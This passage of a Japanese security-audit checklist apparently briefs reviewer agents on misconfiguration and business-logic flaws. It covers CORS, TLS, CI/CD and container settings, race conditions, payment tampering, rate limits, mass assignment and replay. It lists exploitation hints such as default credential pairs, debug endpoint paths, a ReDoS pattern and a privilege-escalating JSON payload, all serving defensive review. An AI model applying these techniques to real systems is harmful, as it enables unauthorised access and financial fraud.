  - Origin の動的反映: リクエストの `Origin` をそのまま `Access-Control-Allow-Origin` に設定 → 任意のサイトからクレデンシャル付きリクエスト
  - 正規表現の不備: `.*\.example\.com` → `attackerexample.com` にマッチ
  - `null` origin の許可 → `<iframe sandbox>` からのリクエストが成立
- **WHY DANGEROUS**: 認証済みユーザーのデータを攻撃者のサイトから取得
- **SEVERITY**:
  - Critical: Origin 動的反映 + Credentials: true + 機密 API
  - High: `null` origin 許可 + Credentials: true
  - Medium: ワイルドカード `*` で非認証 API が公開（内部 API が意図せず公開）
  - Low: CORS 設定が広いが Credentials が false

#### 5-2. Missing Security Headers

- **WHAT**: セキュリティヘッダーの欠如
- **WHERE**: HTTP レスポンスヘッダー、Web サーバー / リバースプロキシ設定

| Header | Missing Impact | Severity |
|--------|---------------|----------|
| `Content-Security-Policy` | XSS の影響を増大。`unsafe-inline` / `unsafe-eval` があると実質無効 | High (XSS 存在時は Critical) |
| `Strict-Transport-Security` | ダウングレード攻撃 (HTTPS → HTTP) で Cookie 窃取 | High |
| `X-Content-Type-Options: nosniff` | MIME sniffing による XSS（HTML として解釈されるファイルアップロード） | Medium |
| `X-Frame-Options` / CSP `frame-ancestors` | Clickjacking | Medium |
| `Permissions-Policy` | 不要なブラウザ API（カメラ、マイク、位置情報）へのアクセス | Low |
| `Referrer-Policy` | 機密情報（トークン等）を含む URL が Referer で外部に漏洩 | Medium |
| `Cross-Origin-Opener-Policy` | Spectre 系サイドチャネル攻撃 | Low |
| `Cross-Origin-Resource-Policy` | リソースの意図しないクロスオリジン読み込み | Low |

- **SEVERITY**: 個々のヘッダー欠如は Medium 以下だが、他の脆弱性と組み合わさることで Critical に昇格する

#### 5-3. Dependency Vulnerabilities

- **WHAT**: 既知の脆弱性を持つ依存パッケージ
- **WHERE**: `package.json`, `package-lock.json`, `requirements.txt`, `Pipfile.lock`, `go.sum`, `Cargo.lock`, `pom.xml`, `Gemfile.lock`
- **HOW TO EXPLOIT**:
  - **Known CVEs**: 公開されたエクスプロイトコードを使用して直接攻撃
  - **Typosquatting**: 正規パッケージに類似した名前の悪意あるパッケージ (`lodash` → `1odash`, `colors` → `co1ors`)
  - **Install scripts**: `postinstall` / `preinstall` スクリプトで任意コード実行
  - **Dependency confusion**: 内部パッケージ名と同名のパッケージを公開レジストリに登録
- **WHY DANGEROUS**: サプライチェーン攻撃は検知が困難で、影響範囲が広い
- **SEVERITY**:
  - Critical: RCE を可能にする既知 CVE を持つパッケージが本番で使用中
  - High: 認証バイパス / データ漏洩を可能にする CVE、疑わしい install スクリプト
  - Medium: DoS を可能にする CVE、メンテナンス停止パッケージ
  - Low: 低リスクの CVE、非常に古いが直接的な脆弱性が不明

#### 5-4. Default Credentials and Debug Endpoints

- **WHAT**: デフォルトクレデンシャル、デバッグ機能の残存
- **WHERE**: 管理者パネル、データベース接続、キャッシュサーバー、メッセージブローカー
- **HOW TO EXPLOIT**:
  - デフォルトクレデンシャル: `admin:admin`, `root:root`, `admin:password`, `postgres:postgres`
  - デバッグエンドポイント: `/debug`, `/console`, `/graphiql`, `/__debug__/`, `/actuator/`, `/_profiler`
  - 環境変数: `DEBUG=true`, `NODE_ENV=development` が本番で有効
  - ヘルスチェック: `/health` が内部状態（DB 接続文字列等）を露出
- **WHY DANGEROUS**: 即座に管理者アクセス、内部情報の完全な露出
- **SEVERITY**:
  - Critical: デフォルトクレデンシャルで管理者アクセス可能
  - High: デバッグコンソールが認証なしで公開（Django debug toolbar, Spring Actuator）
  - Medium: デバッグモードが有効で詳細なエラー情報が露出
  - Low: ヘルスチェックが軽微な内部情報を含む

#### 5-5. Insecure TLS Configuration

- **WHAT**: TLS / SSL の設定不備
- **WHERE**: Web サーバー設定、API クライアントの証明書検証
- **HOW TO EXPLOIT**:
  - 古い TLS バージョン (TLS 1.0 / 1.1) → BEAST, POODLE 攻撃
  - 弱い暗号スイート (RC4, DES, NULL cipher) → 暗号解読
  - 証明書検証の無効化 (`verify=False`, `rejectUnauthorized: false`, `InsecureSkipVerify: true`) → MITM
  - HTTP から HTTPS へのリダイレクトなし → 初回アクセスの傍受
- **WHY DANGEROUS**: 通信の傍受・改竄（Man-in-the-Middle）
- **SEVERITY**:
  - Critical: 証明書検証の無効化が本番コードに存在
  - High: TLS 1.0 / 1.1 が有効、弱い暗号スイートの使用
  - Medium: HSTS なし、HTTP → HTTPS リダイレクトなし
  - Low: 最新の暗号スイートのみ使用していないが現実的な攻撃は困難

#### 5-6. CI/CD Pipeline Poisoning

- **WHAT**: CI/CD パイプラインを侵害してコードベースに悪意あるコードを注入する攻撃
- **WHERE**: `.github/workflows/`, `.gitlab-ci.yml`, `Jenkinsfile`, `Dockerfile`, ビルドスクリプト
- **HOW TO EXPLOIT**:
  - **Workflow injection**: `${{ github.event.issue.title }}` がシェルコマンドに展開 → コマンドインジェクション
  - **Pull request target trigger**: `pull_request_target` + checkout of PR head → 外部 PR から secrets にアクセス
  - **Self-hosted runner abuse**: 共有ランナーで前のジョブの残留データを読み取り
  - **Artifact poisoning**: CI/CD の中間成果物を改竄
  - **Secret exposure in logs**: CI ログに secrets がマスクされずに出力
- **WHY DANGEROUS**: ビルドパイプラインの掌握 → 任意のコードをプロダクションにデプロイ
- **SEVERITY**:
  - Critical: `pull_request_target` + PR head checkout + secrets access
  - High: ワークフロー内でのコマンドインジェクション、self-hosted runner に残留データ
  - Medium: CI ログに secrets が部分的に露出
  - Low: ワークフローの権限が過剰だが直接的な悪用経路が不明

#### 5-7. Container and Infrastructure Misconfigurations

- **WHAT**: コンテナ / インフラ設定の不備
- **WHERE**: `Dockerfile`, `docker-compose.yml`, Kubernetes manifests, Terraform / CloudFormation
- **HOW TO EXPLOIT**:
  - `--privileged` フラグ → コンテナエスケープ
  - `root` ユーザーでの実行 → 権限昇格の足がかり
  - ホストのファイルシステムマウント (`-v /:/host`) → ホスト全体へのアクセス
  - 機密情報が Docker イメージのレイヤーに残存（`docker history` で復元）
  - Kubernetes: `hostPID`, `hostNetwork`, permissive `PodSecurityPolicy`
  - S3 バケットの公開設定、IAM ポリシーの過剰権限
- **WHY DANGEROUS**: コンテナエスケープ → ホストシステムの掌握、クラウドリソースの不正利用
- **SEVERITY**:
  - Critical: `--privileged` / ホスト全体マウント / root 実行 + ネットワーク公開
  - High: Docker イメージに secrets 残存、過剰な IAM 権限
  - Medium: non-root だが不必要な capability が付与
  - Low: 最小権限ではないが直接的な脱出経路がない

---

## Agent 6: Business Logic Abuser — ビジネスロジック悪用専門 (both)

技術的な脆弱性ではなく、アプリケーションのビジネスロジックの欠陥を悪用する経路を探す。自動スキャナーでは検出困難な攻撃に特化。

### Check Items

#### 6-1. Race Conditions / TOCTOU

- **WHAT**: 並行リクエストによる Time-of-Check to Time-of-Use の悪用
- **WHERE**: 残高チェック → 引き落とし、在庫確認 → 注文確定、クーポン適用、投票/いいね
- **HOW TO EXPLOIT**:
  - **Double-spend**: 残高 100 円で 100 円の商品を同時に 2 回購入リクエスト → 両方とも「残高 >= 100」のチェックを通過
  - **Concurrent coupon usage**: 「1回のみ使用可」のクーポンを並行リクエストで複数回使用
  - **Like/Vote inflation**: 同一ユーザーの重複チェックが非アトミック → 並行リクエストで複数回投票
  - **Race in file operations**: ファイル存在チェック → ファイル作成の間に別プロセスがファイルを操作
- **WHY DANGEROUS**: 金銭的損失、データの不整合、ビジネスルールの完全な無効化
- **SEVERITY**:
  - Critical: 金銭に関わる操作（送金、購入、クーポン）でアトミック性が欠如
  - High: ポイント / クレジットシステムで race condition が存在
  - Medium: 投票 / レーティングの操作が可能
  - Low: 表示カウンターの不整合（ビジネスへの実害が小さい）

#### 6-2. Payment / Pricing Manipulation

- **WHAT**: 価格・支払いフローの改竄
- **WHERE**: カート / チェックアウトフロー、割引適用ロジック、通貨変換、サブスクリプション管理
- **HOW TO EXPLOIT**:
  - **Negative quantity**: 数量に `-1` を指定 → 返金が発生
  - **Price override**: クライアントから送信される価格を改竄（hidden field の値を変更）
  - **Currency rounding**: 通貨変換の丸め誤差を利用した裁定取引
  - **Coupon stacking**: 併用不可のクーポンを API レベルで強制適用
  - **Free trial abuse**: 同一メールアドレスの変種 (`+1`, `.` trick) でトライアルを無限再開
  - **Plan downgrade with feature retention**: ダウングレード後も上位プランの機能がアクティブ
- **WHY DANGEROUS**: 直接的な金銭的損失
- **SEVERITY**:
  - Critical: 負の数量 / 価格のクライアント側制御で金銭的損失が発生
  - High: クーポンの無限再利用、通貨丸め誤差の悪用
  - Medium: フリートライアルの abuse、プラン切り替えの不整合
  - Low: ポイントシステムの軽微な不整合

#### 6-3. Rate Limiting Gaps

- **WHAT**: レート制限の欠如または回避可能性
- **WHERE**: ログイン、パスワードリセット、SMS 送信、API エンドポイント全般
- **HOW TO EXPLOIT**:
  - レート制限なし → ブルートフォース、credential stuffing
  - IP ベースのレート制限 → `X-Forwarded-For` ヘッダーで回避
  - アカウント単位のレート制限 → 複数アカウントで分散
  - エンドポイント別のレート制限 → 同等の別エンドポイントには制限なし
  - レート制限のリセットタイミングが予測可能 → スライディングウィンドウではなく固定ウィンドウ
- **WHY DANGEROUS**: ブルートフォース攻撃、サービス悪用、SMS 爆撃による課金
- **SEVERITY**:
  - Critical: ログインにレート制限なし + 2FA なし
  - High: パスワードリセット / SMS 送信にレート制限なし
  - Medium: レート制限あるが `X-Forwarded-For` で回避可能
  - Low: レート制限はあるが閾値が緩すぎる

#### 6-4. Enumeration Attacks

- **WHAT**: システムから存在情報を推測可能な応答の差異
- **WHERE**: ログインフォーム、パスワードリセット、ユーザー登録、API レスポンス
- **HOW TO EXPLOIT**:
  - ログイン: 「ユーザーが存在しません」vs「パスワードが間違っています」→ ユーザー名の列挙
  - 登録: 「このメールアドレスは既に使用されています」→ 登録済みメールの確認
  - パスワードリセット: 「メールを送信しました」が存在するメールのみ → タイミング差で推測
  - API: `/api/users/123` が 404 vs 403 → リソースの存在確認
- **WHY DANGEROUS**: 攻撃対象の特定、クレデンシャルスタッフィングの効率化
- **SEVERITY**:
  - Critical: ユーザー列挙 + レート制限なし + パスワードスプレー可能
  - High: メールアドレスの列挙が可能（プライバシー影響）
  - Medium: タイミング差による推測が理論的に可能
  - Low: 列挙は可能だが公開情報のみ

#### 6-5. Mass Assignment / Over-Posting

- **WHAT**: リクエストボディの追加フィールドがモデルに直接反映される脆弱性
- **WHERE**: ユーザー登録 / 更新 API、ORM のモデルバインディング
- **HOW TO EXPLOIT**:
  - ユーザー更新: `{"name": "hacker", "role": "admin"}` → `role` が更新される
  - 登録: `{"email": "...", "password": "...", "isVerified": true}` → メール検証をスキップ
  - Rails: `params.permit` の漏れ、Django: `fields = '__all__'` の使用
  - Node.js: `Object.assign(user, req.body)` でリクエストボディ全体をマージ
- **WHY DANGEROUS**: 権限昇格、検証バイパス、内部フラグの操作
- **SEVERITY**:
  - Critical: `role` / `isAdmin` / `permissions` が mass assignment で変更可能
  - High: `isVerified` / `isBanned` 等のアカウント状態フラグが変更可能
  - Medium: 内部フィールド（`createdAt`, `updatedAt`）が上書き可能
  - Low: 影響の小さいフィールドのみが変更可能

#### 6-6. Workflow Bypass

- **WHAT**: 意図されたワークフロー（ステップの順序）をスキップする攻撃
- **WHERE**: 多段階フォーム（ウィザード）、承認フロー、支払いフロー
- **HOW TO EXPLOIT**:
  - Step 1 (入力) → Step 2 (確認) → Step 3 (実行) で、Step 3 を直接呼び出す
  - 管理者承認フローで、承認前の状態から直接「承認済み」API を呼び出す
  - 支払いフローで、支払い完了コールバックを偽装
  - メール検証フローをスキップして直接アクティベート
- **WHY DANGEROUS**: セキュリティチェック / ビジネス検証の完全なバイパス
- **SEVERITY**:
  - Critical: 支払いフローのバイパス（無料で商品 / サービスを取得）
  - High: 承認フローのバイパス（未承認コンテンツの公開）
  - Medium: 確認ステップのスキップ（ただし後続の検証で捕捉可能）
  - Low: UI ウィザードのステップスキップ（サーバー側で検証済み）

#### 6-7. Resource Consumption / DoS via Business Logic

- **WHAT**: ビジネスロジックの悪用によるリソース枯渇
- **WHERE**: ファイルアップロード、レポート生成、検索機能、エクスポート機能
- **HOW TO EXPLOIT**:
  - **Zip bomb**: 圧縮ファイルアップロードで展開後に巨大サイズ
  - **ReDoS**: 正規表現の catastrophic backtracking (`(a+)+$` に `aaaa...!`)
  - **Expensive queries**: 深いネストの GraphQL クエリ、全件取得の REST API
  - **Infinite pagination**: `?page=1&size=999999` でサーバーメモリを圧迫
  - **Report generation**: 巨大な日付範囲 / フィルタなしでのレポート生成要求
  - **Email bombing**: パスワードリセットメールの大量送信（レート制限なし）
- **WHY DANGEROUS**: サービス停止、インフラコストの高騰、他ユーザーへの影響
- **SEVERITY**:
  - Critical: 単一リクエストでサーバーをクラッシュ可能（zip bomb, ReDoS on critical path）
  - High: サーバーリソースを長時間占有可能（巨大クエリ、無制限エクスポート）
  - Medium: 反復リクエストでサービス品質が劣化
  - Low: コスト増大のみ（サービスは継続可能）

#### 6-8. Replay Attacks

- **WHAT**: 正当なリクエストをキャプチャして再送する攻撃
- **WHERE**: 支払いリクエスト、認証トークン、OTP / ワンタイムコード
- **HOW TO EXPLOIT**:
  - 支払い完了通知（Webhook）をリプレイ → 二重付与
  - OTP をキャプチャして再利用（有効期間内 / 使用済みチェックなし）
  - API リクエストに冪等性キーがない → 同一リクエストの再送で重複処理
  - nonce なし → 署名付きリクエストのリプレイ
- **WHY DANGEROUS**: 金銭的損失、認証バイパス、データの重複
- **SEVERITY**:
  - Critical: 支払い Webhook のリプレイで金銭的損失が発生
  - High: OTP / ワンタイムトークンが再利用可能
  - Medium: API に冪等性保証がなく重複処理が発生
  - Low: リプレイは可能だが影響が読み取り操作のみ
